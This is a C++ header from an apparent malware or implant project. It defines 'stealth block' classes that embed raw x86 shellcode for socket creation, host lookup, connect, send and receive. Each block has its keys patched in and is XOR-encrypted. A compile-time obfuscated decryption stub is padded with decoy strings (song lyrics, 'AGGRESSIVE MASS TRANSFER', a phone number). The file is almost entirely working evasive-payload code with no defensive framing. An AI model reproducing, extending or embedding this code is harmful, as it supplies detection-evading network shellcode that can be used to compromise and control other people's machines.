#ifndef __WHISPERER_STUBS_
#define __WHISPERER_STUBS_

#ifndef __UTILITIES_
#include "Utilities.h"
#endif

#ifndef __DEBUG_HEADER_
#include "DebugHeader.h"
#endif

#if defined(DEBUGGING) && !defined(_CSTDIO_)
#include <cstdio>
#endif

class BasicStealthBlock {
protected:
	unsigned char *CodeArray;
	unsigned char *pRealCodeArray;
	unsigned long CodeLength;
	unsigned long CodeOffset;
	unsigned long ebx;
	unsigned long edx;

	void EncryptBody() {
		unsigned char counter = 0;
		unsigned char buffer[8];

		*((unsigned long*)buffer + 0) = edx;
		*((unsigned long*)buffer + 1) = ebx;

		for (unsigned long i = this->CodeOffset; i < this->CodeLength; i++) {
			this->pRealCodeArray[i] ^= buffer[counter];

			if (++counter > 7)
				counter = 0;
		}
	};

	void Metamorphosis() {

	};

	void AssignKeys() {
		bool ebxfound = false, eaxfound = false;

		for (unsigned long i = 0; i < this->CodeOffset - 4; i++) {
			if (*(unsigned long*)(this->pRealCodeArray + i) == 0xaaaaaaaa && !ebxfound)
				*(unsigned long*)(this->pRealCodeArray + i) = ebx;
			

			if (*(unsigned long*)(this->pRealCodeArray + i) == 0xbbbbbbbb && !eaxfound)
				*(unsigned long*)(this->pRealCodeArray + i) = edx;

		}
	};

	void AssignOffset() {
		for (unsigned long i = 0; i < this->CodeLength - 8; i++) {
			if (*(unsigned long long*)(this->pRealCodeArray + i) == 0x2222222222222222) {
				Utils::memset(this->pRealCodeArray + i, 0x90, 8); // fill the delimiter with nops so that it doesn't crash upon execution
				this->CodeOffset = i; // store offset
				break;
			}
		}
	};

	void init() {
		this->pRealCodeArray = new unsigned char[this->CodeLength]();
		Utils::memcpy(this->pRealCodeArray, this->CodeArray, this->CodeLength);
	};

public:
	~BasicStealthBlock() {
		delete[] this->pRealCodeArray;
	};

	unsigned long len() {
		return this->CodeLength;
	};

	unsigned char *get() {
		this->AssignOffset();
		this->AssignKeys();
		this->Metamorphosis();
		this->EncryptBody();

		return this->pRealCodeArray;
	};

};

class StartupCallStub : public BasicStealthBlock {
private:
	unsigned char LocalCodeArray[90] = {
		0x55, 0x89, 0xE5, 0x81, 0xEC, 0x90, 0x01, 0x00, 0x00, 0xBB, 0xAA, 0xAA,
		0xAA, 0xAA, 0xBA, 0xBB, 0xBB, 0xBB, 0xBB, 0xB9, 0x38, 0x00, 0x00, 0x00,
		0x8B, 0x45, 0x08, 0x8B, 0x00, 0x8B, 0x40, 0x10, 0xFF, 0xD0, 0x22, 0x22,
		0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x8B, 0x45, 0x08, 0x8B, 0x00, 0x8B,
		0x40, 0x1C, 0x8D, 0x9D, 0x70, 0xFE, 0xFF, 0xFF, 0x53, 0x68, 0x02, 0x02,
		0x00, 0x00, 0xFF, 0xD0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x89, 0xEC, 0x5D, 0xC2, 0x04, 0x00
	};

public:
	StartupCallStub(unsigned long Ebx, unsigned long Edx) {
		this->CodeArray = this->LocalCodeArray;
		this->CodeLength = sizeof(this->LocalCodeArray);
		this->ebx = Ebx;
		this->edx = Edx;

		this->init();
	};
};
class LookupHostAddress : public BasicStealthBlock {
private:
	unsigned char LocalCodeArray[160] = {
		0x55, 0x89, 0xE5, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xBA, 0xBB, 0xBB, 0xBB,
		0xBB, 0xB9, 0x84, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x08, 0x8B, 0x00, 0x8B,
		0x40, 0x10, 0xFF, 0xD0, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		0x8B, 0x5D, 0x08, 0x89, 0xD8, 0x8B, 0x1B, 0x05, 0x3E, 0x02, 0x00, 0x00,
		0x50, 0xFF, 0x53, 0x28, 0x85, 0xC0, 0x74, 0x5D, 0x66, 0x8B, 0x58, 0x08,
		0x66, 0x83, 0xFB, 0x02, 0x74, 0x08, 0x66, 0x83, 0xFB, 0x17, 0x74, 0x1B,
		0xEB, 0x4B, 0x8B, 0x4D, 0x08, 0x66, 0x89, 0x99, 0x44, 0x03, 0x00, 0x00,
		0x8B, 0x58, 0x0C, 0x8B, 0x1B, 0x8B, 0x1B, 0x89, 0x99, 0x2A, 0x02, 0x00,
		0x00, 0xEB, 0x32, 0x8B, 0x4D, 0x08, 0x66, 0x89, 0x99, 0x44, 0x03, 0x00,
		0x00, 0x8B, 0x58, 0x0C, 0x8B, 0x1B, 0x6A, 0x10, 0x53, 0x81, 0xC1, 0x2E,
		0x02, 0x00, 0x00, 0x51, 0xE8, 0x02, 0x00, 0x00, 0x00, 0xEB, 0x12, 0x55,
		0x89, 0xE5, 0x8B, 0x4D, 0x10, 0x8B, 0x7D, 0x08, 0x8B, 0x75, 0x0C, 0xF3,
		0xA4, 0x5D, 0xC2, 0x0C, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x31, 0xC0,
		0x5D, 0xC2, 0x04, 0x00,
	};

public:
	LookupHostAddress(unsigned long Ebx, unsigned long Edx) {
		this->CodeArray = this->LocalCodeArray;
		this->CodeLength = sizeof(this->LocalCodeArray);
		this->ebx = Ebx;
		this->edx = Edx;

		this->init();
	};

};
class SocketCallStub : public BasicStealthBlock {
private:
	unsigned char LocalCodeArray[80] = {
		0x55, 0x89, 0xE5, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xBA, 0xBB, 0xBB, 0xBB,
		0xBB, 0xB9, 0x34, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x08, 0x8B, 0x00, 0x8B,
		0x40, 0x10, 0xFF, 0xD0, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		0x8B, 0x5D, 0x08, 0x8B, 0x03, 0x8B, 0x40, 0x14, 0x8A, 0x4B, 0x1C, 0x84,
		0xC9, 0x74, 0x07, 0xB9, 0x17, 0x00, 0x00, 0x00, 0xEB, 0x05, 0xB9, 0x02,
		0x00, 0x00, 0x00, 0x6A, 0x06, 0x6A, 0x01, 0x51, 0xFF, 0xD0, 0x8B, 0x5D,
		0x08, 0x89, 0x43, 0x20, 0x5D, 0xC2, 0x04, 0x00
	};

public:
	SocketCallStub(unsigned long Ebx, unsigned long Edx) {
		this->CodeArray = this->LocalCodeArray;
		this->CodeLength = sizeof(this->LocalCodeArray);
		this->ebx = Ebx;
		this->edx = Edx;

		this->init();
	};

};
class ConnectCallStub : public BasicStealthBlock {
private:
	unsigned char LocalCodeArray[160] = {
		0x55, 0x89, 0xE5, 0x83, 0xEC, 0x20, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xBA,
		0xBB, 0xBB, 0xBB, 0xBB, 0xB9, 0x81, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x08,
		0x8B, 0x00, 0x8B, 0x40, 0x10, 0xFF, 0xD0, 0x22, 0x22, 0x22, 0x22, 0x22,
		0x22, 0x22, 0x22, 0x8B, 0x5D, 0x08, 0x8B, 0x03, 0x8B, 0x40, 0x18, 0x89,
		0x45, 0xFC, 0x8A, 0x4B, 0x1C, 0x84, 0xC9, 0x74, 0x02, 0xEB, 0x2A, 0x66,
		0x8B, 0x53, 0x1E, 0x8D, 0x45, 0xEC, 0x66, 0xC7, 0x00, 0x02, 0x00, 0x66,
		0x89, 0x50, 0x02, 0x8B, 0x53, 0x08, 0x89, 0x50, 0x04, 0x6A, 0x10, 0x50,
		0xFF, 0x73, 0x20, 0xFF, 0x55, 0xFC, 0x8B, 0x5D, 0x08, 0x89, 0x83, 0x50,
		0x03, 0x00, 0x00, 0xEB, 0x35, 0x66, 0x8B, 0x53, 0x1E, 0x8D, 0x45, 0xE0,
		0x66, 0xC7, 0x00, 0x17, 0x00, 0x66, 0x89, 0x50, 0x02, 0xB9, 0x10, 0x00,
		0x00, 0x00, 0x89, 0xC7, 0x83, 0xC7, 0x08, 0x89, 0xDE, 0x83, 0xC6, 0x0C,
		0xF3, 0xA4, 0x6A, 0x1C, 0x50, 0xFF, 0x73, 0x20, 0xFF, 0x55, 0xFC, 0x8B,
		0x5D, 0x08, 0x89, 0x83, 0x50, 0x03, 0x00, 0x00, 0x90, 0x90, 0x89, 0xEC,
		0x5D, 0xC2, 0x04, 0x00
	};

public:
	ConnectCallStub(unsigned long Ebx, unsigned long Edx) {
		this->CodeArray = this->LocalCodeArray;
		this->CodeLength = sizeof(this->LocalCodeArray);
		this->ebx = Ebx;
		this->edx = Edx;

		this->init();
	};

};
class CopyCallStub : public BasicStealthBlock {
private:
	unsigned char LocalCodeArray[60] = {
		0x55, 0x89, 0xE5, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xBA, 0xBB, 0xBB, 0xBB,
		0xBB, 0xB9, 0x20, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x08, 0x8B, 0x00, 0x8B,
		0x40, 0x10, 0xFF, 0xD0, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		0x8B, 0x5D, 0x08, 0x8B, 0x73, 0x24, 0x8B, 0xBB, 0x54, 0x03, 0x00, 0x00,
		0x8B, 0x8B, 0x4C, 0x03, 0x00, 0x00, 0xF3, 0xA4, 0x5D, 0xC2, 0x04, 0x00
	};

public:
	CopyCallStub(unsigned long Ebx, unsigned long Edx) {
		this->CodeArray = this->LocalCodeArray;
		this->CodeLength = sizeof(this->LocalCodeArray);
		this->ebx = Ebx;
		this->edx = Edx;

		this->init();
	};

};
class SendCallStub : public BasicStealthBlock {
private:
	unsigned char LocalCodeArray[80] = {
		0x55, 0x89, 0xE5, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xBA, 0xBB, 0xBB, 0xBB,
		0xBB, 0xB9, 0x34, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x08, 0x8B, 0x00, 0x8B,
		0x40, 0x10, 0xFF, 0xD0, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		0x8B, 0x5D, 0x08, 0x8B, 0x03, 0x8B, 0x40, 0x2C, 0x6A, 0x00, 0xFF, 0xB3,
		0x48, 0x03, 0x00, 0x00, 0xFF, 0x73, 0x04, 0xFF, 0x73, 0x20, 0xFF, 0xD0,
		0x8B, 0x5D, 0x08, 0x89, 0x83, 0x50, 0x03, 0x00, 0x00, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x5D, 0xC2, 0x04, 0x00
	};

public:
	SendCallStub(unsigned long Ebx, unsigned long Edx) {
		this->CodeArray = this->LocalCodeArray;
		this->CodeLength = sizeof(this->LocalCodeArray);
		this->ebx = Ebx;
		this->edx = Edx;

		this->init();
	};

};
class RecvCallStub : public BasicStealthBlock {
private:
	unsigned char LocalCodeArray[320] = {
		0x55, 0x89, 0xE5, 0x83, 0xEC, 0x14, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xBA,
		0xBB, 0xBB, 0xBB, 0xBB, 0xB9, 0x21, 0x01, 0x00, 0x00, 0x8B, 0x45, 0x08,
		0x8B, 0x00, 0x8B, 0x40, 0x10, 0xFF, 0xD0, 0x22, 0x22, 0x22, 0x22, 0x22,
		0x22, 0x22, 0x22, 0x8B, 0x5D, 0x08, 0x31, 0xC9, 0x89, 0x4D, 0xF4, 0x89,
		0x4D, 0xEC, 0x8B, 0x8B, 0x58, 0x03, 0x00, 0x00, 0x89, 0x4D, 0xFC, 0x51,
		0xE8, 0x83, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0xBE, 0x00, 0x00,
		0x00, 0x89, 0x45, 0xF8, 0x8B, 0x5D, 0x08, 0x6A, 0x00, 0x8B, 0x45, 0xFC,
		0x2B, 0x45, 0xF4, 0x89, 0x45, 0xF0, 0x50, 0x8B, 0x45, 0xF8, 0x03, 0x45,
		0xF4, 0x50, 0xFF, 0x73, 0x20, 0x8B, 0x1B, 0xFF, 0x53, 0x30, 0x83, 0xF8,
		0xFF, 0x0F, 0x84, 0x94, 0x00, 0x00, 0x00, 0x8B, 0x5D, 0x08, 0x85, 0xC0,
		0x0F, 0x84, 0xA0, 0x00, 0x00, 0x00, 0x3B, 0x45, 0xF0, 0x74, 0x05, 0x83,
		0xF8, 0xFF, 0x74, 0x7F, 0x01, 0x45, 0xEC, 0x8B, 0x5D, 0x08, 0x8B, 0x55,
		0xFC, 0x03, 0x93, 0x58, 0x03, 0x00, 0x00, 0x52, 0x52, 0xE8, 0x26, 0x00,
		0x00, 0x00, 0x5A, 0x89, 0xC7, 0x8B, 0x75, 0xF8, 0x8B, 0x4D, 0xFC, 0xF3,
		0xA4, 0x89, 0x55, 0xFC, 0x50, 0xFF, 0x75, 0xF8, 0xE8, 0x2D, 0x00, 0x00,
		0x00, 0x58, 0x89, 0x45, 0xF8, 0x8B, 0x83, 0x58, 0x03, 0x00, 0x00, 0x01,
		0x45, 0xF4, 0xEB, 0x88, 0x55, 0x89, 0xE5, 0x6A, 0x04, 0x68, 0x00, 0x30,
		0x00, 0x00, 0xFF, 0x75, 0x08, 0x6A, 0x00, 0x8B, 0x45, 0x00, 0x8B, 0x40,
		0x08, 0x8B, 0x00, 0xFF, 0x50, 0x20, 0x5D, 0xC2, 0x04, 0x00, 0x55, 0x89,
		0xE5, 0x68, 0x00, 0x80, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0x75, 0x08, 0x8B,
		0x45, 0x00, 0x8B, 0x40, 0x08, 0x8B, 0x00, 0xFF, 0x50, 0x24, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x5D, 0xC2, 0x04, 0x00, 0x8B,
		0x5D, 0x08, 0xC7, 0x83, 0x50, 0x03, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
		0xFF, 0x75, 0xF8, 0xE8, 0xC6, 0xFF, 0xFF, 0xFF, 0xEB, 0x1C, 0x8B, 0x5D,
		0x08, 0x8B, 0x45, 0xEC, 0x89, 0x83, 0x4C, 0x03, 0x00, 0x00, 0x8B, 0x45,
		0xF8, 0x89, 0x43, 0x24, 0xC7, 0x83, 0x50, 0x03, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x89, 0xEC, 0x5D, 0xC2, 0x04, 0x00
	};

public:
	RecvCallStub(unsigned long Ebx, unsigned long Edx) {
		this->CodeArray = this->LocalCodeArray;
		this->CodeLength = sizeof(this->LocalCodeArray);
		this->ebx = Ebx;
		this->edx = Edx;

		this->init();
	};

};
class RequestCleanupStub : public BasicStealthBlock {
private:
	unsigned char LocalCodeArray[120] = {
		0x55, 0x89, 0xE5, 0x83, 0xEC, 0x04, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xBA,
		0xBB, 0xBB, 0xBB, 0xBB, 0xB9, 0x59, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x08,
		0x8B, 0x00, 0x8B, 0x40, 0x10, 0xFF, 0xD0, 0x22, 0x22, 0x22, 0x22, 0x22,
		0x22, 0x22, 0x22, 0x8B, 0x5D, 0x08, 0x8B, 0x13, 0x89, 0x55, 0xFC, 0xFF,
		0x73, 0x20, 0xFF, 0x52, 0x34, 0x8B, 0x5D, 0x08, 0xFF, 0xB3, 0x4C, 0x03,
		0x00, 0x00, 0xFF, 0x73, 0x24, 0xE8, 0x12, 0x00, 0x00, 0x00, 0x68, 0x00,
		0x80, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0x73, 0x24, 0x8B, 0x55, 0xFC, 0xFF,
		0x52, 0x24, 0xEB, 0x11, 0x55, 0x89, 0xE5, 0x8B, 0x7D, 0x08, 0x8B, 0x4D,
		0x0C, 0x31, 0xC0, 0xF3, 0xAA, 0x5D, 0xC2, 0x08, 0x00, 0x31, 0xC0, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x89, 0xEC, 0x5D, 0xC2, 0x04, 0x00
	};

public:
	RequestCleanupStub(unsigned long Ebx, unsigned long Edx) {
		this->CodeArray = this->LocalCodeArray;
		this->CodeLength = sizeof(this->LocalCodeArray);
		this->ebx = Ebx;
		this->edx = Edx;

		this->init();
	};

};
class ShutdownStub : public BasicStealthBlock {
private:
	unsigned char LocalCodeArray[100] = {
		0x55, 0x89, 0xE5, 0x83, 0xEC, 0x04, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xBA,
		0xBB, 0xBB, 0xBB, 0xBB, 0xB9, 0x45, 0x00, 0x00, 0x00, 0x8B, 0x45, 0x08,
		0x8B, 0x00, 0x8B, 0x40, 0x10, 0xFF, 0xD0, 0x22, 0x22, 0x22, 0x22, 0x22,
		0x22, 0x22, 0x22, 0x8B, 0x5D, 0x08, 0x8B, 0x1B, 0x89, 0x5D, 0xFC, 0xFF,
		0x53, 0x38, 0x8B, 0x5D, 0xFC, 0x8A, 0x43, 0x3C, 0x3C, 0x01, 0x74, 0x0C,
		0x8B, 0x5D, 0xFC, 0x8A, 0x43, 0x3D, 0x3C, 0x01, 0x74, 0x09, 0xEB, 0x0D,
		0xFF, 0x33, 0xFF, 0x53, 0x3E, 0xEB, 0xED, 0xFF, 0x73, 0x04, 0xFF, 0x53,
		0x3E, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x89, 0xEC,
		0x5D, 0xC2, 0x04, 0x00
	};

public:
	ShutdownStub(unsigned long Ebx, unsigned long Edx) {
		this->CodeArray = this->LocalCodeArray;
		this->CodeLength = sizeof(this->LocalCodeArray);
		this->ebx = Ebx;
		this->edx = Edx;

		this->init();
	};

};


template <unsigned char k, unsigned char m>
class DecryptionStub {
private:
	unsigned char CodeArray[332];

public:
	constexpr unsigned char e(unsigned char v) const {
		return (v ^ k) + (((m * m) + (k * m + 3 * m) + (3 * k)) % m);
	};
	constexpr DecryptionStub() :
		CodeArray{
		e(0x55),e(0x89),e(0xE5),e(0x83),e(0xEC),e(0x08),e(0x16),e(0x17),e(0x89),e(0x5D),e(0xFC),e(0x16),
		e(0x17),e(0x89),e(0x55),e(0xF8),e(0x16),e(0x17),e(0x8B),e(0x7D),e(0x04),e(0x01),e(0xF9),e(0x31),
		e(0xC0),e(0x16),e(0x17),e(0x50),e(0xEB),e(0x61),e(0x44),e(0x65),e(0x6A),e(0x61),e(0x20),e(0x76),
		e(0x75),e(0x2C),e(0x20),e(0x49),e(0x27),e(0x76),e(0x65),e(0x20),e(0x6A),e(0x75),e(0x73),e(0x74),
		e(0x20),e(0x62),e(0x65),e(0x65),e(0x6E),e(0x20),e(0x69),e(0x6E),e(0x20),e(0x74),e(0x68),e(0x69),
		e(0x73),e(0x20),e(0x70),e(0x6C),e(0x61),e(0x63),e(0x65),e(0x20),e(0x62),e(0x65),e(0x66),e(0x6F),
		e(0x72),e(0x65),e(0x21),e(0x48),e(0x69),e(0x67),e(0x68),e(0x65),e(0x72),e(0x20),e(0x6F),e(0x6E),
		e(0x20),e(0x74),e(0x68),e(0x65),e(0x20),e(0x73),e(0x74),e(0x72),e(0x65),e(0x65),e(0x74),e(0x2C),
		e(0x20),e(0x61),e(0x6E),e(0x64),e(0x20),e(0x49),e(0x20),e(0x6B),e(0x6E),e(0x6F),e(0x77),e(0x20),
		e(0x69),e(0x74),e(0x27),e(0x73),e(0x20),e(0x6D),e(0x79),e(0x20),e(0x74),e(0x69),e(0x6D),e(0x65),
		e(0x20),e(0x74),e(0x6F),e(0x20),e(0x67),e(0x6F),e(0x21),e(0x16),e(0x17),e(0x58),e(0xE9),e(0x99),
		e(0x00),e(0x00),e(0x00),e(0x41),e(0x47),e(0x47),e(0x52),e(0x45),e(0x53),e(0x53),e(0x49),e(0x56),
		e(0x45),e(0x20),e(0x4D),e(0x41),e(0x53),e(0x53),e(0x20),e(0x54),e(0x52),e(0x41),e(0x4E),e(0x53),
		e(0x46),e(0x45),e(0x52),e(0x21),e(0x16),e(0x17),e(0x44),e(0x65),e(0x6A),e(0x61),e(0x20),e(0x76),
		e(0x75),e(0x2C),e(0x20),e(0x49),e(0x27),e(0x76),e(0x65),e(0x20),e(0x6A),e(0x75),e(0x73),e(0x74),
		e(0x20),e(0x62),e(0x65),e(0x65),e(0x6E),e(0x20),e(0x69),e(0x6E),e(0x20),e(0x74),e(0x68),e(0x69),
		e(0x73),e(0x20),e(0x74),e(0x69),e(0x6D),e(0x65),e(0x20),e(0x62),e(0x65),e(0x66),e(0x6F),e(0x72),
		e(0x65),e(0x21),e(0x48),e(0x69),e(0x67),e(0x68),e(0x65),e(0x72),e(0x20),e(0x6F),e(0x6E),e(0x20),
		e(0x74),e(0x68),e(0x65),e(0x20),e(0x62),e(0x65),e(0x61),e(0x74),e(0x2C),e(0x20),e(0x61),e(0x6E),
		e(0x64),e(0x20),e(0x49),e(0x20),e(0x6B),e(0x6E),e(0x6F),e(0x77),e(0x20),e(0x69),e(0x74),e(0x27),
		e(0x73),e(0x20),e(0x61),e(0x20),e(0x70),e(0x6C),e(0x61),e(0x63),e(0x65),e(0x20),e(0x74),e(0x6F),
		e(0x20),e(0x67),e(0x6F),e(0x21),e(0x90),e(0x90),e(0xCD),e(0x10),e(0x63),e(0x6F),e(0x6E),e(0x74),
		e(0x61),e(0x63),e(0x74),e(0x20),e(0x6D),e(0x65),e(0x20),e(0x61),e(0x74),e(0x20),e(0x28),e(0x37),
		e(0x31),e(0x33),e(0x29),e(0x20),e(0x36),e(0x38),e(0x38),e(0x2D),e(0x30),e(0x38),e(0x38),e(0x38),
		e(0x16),e(0x17),e(0x8A),e(0x1C),e(0x04),e(0x16),e(0x17),e(0x30),e(0x1F),e(0x16),e(0x17),e(0x40),
		e(0x16),e(0x17),e(0x83),e(0xF8),e(0x07),e(0x16),e(0x17),e(0x7F),e(0x02),e(0xEB),e(0x04),e(0x31),
		e(0xC0),e(0x16),e(0x17),e(0x16),e(0x17),e(0x47),e(0x16),e(0x17),e(0x39),e(0xCF),e(0x16),e(0x17),
		e(0x75),e(0xDA),e(0x16),e(0x17),e(0x89),e(0xEC),e(0x5D),e(0xC3),
	}
	{ };
	unsigned long len() {
		return sizeof(this->CodeArray);
	};
	unsigned char *decrypt() {
		for (unsigned long i = 0; i < sizeof(this->CodeArray); i++) {
			CodeArray[i] -= (((m * m) + (k * m + 3 * m) + (3 * k)) % m);
			CodeArray[i] ^= k;
		}

		return this->CodeArray;
	};
};


void RetrieveDefaultStubs(unsigned char **DecryptOut, unsigned long *DecryptLength);



#endif
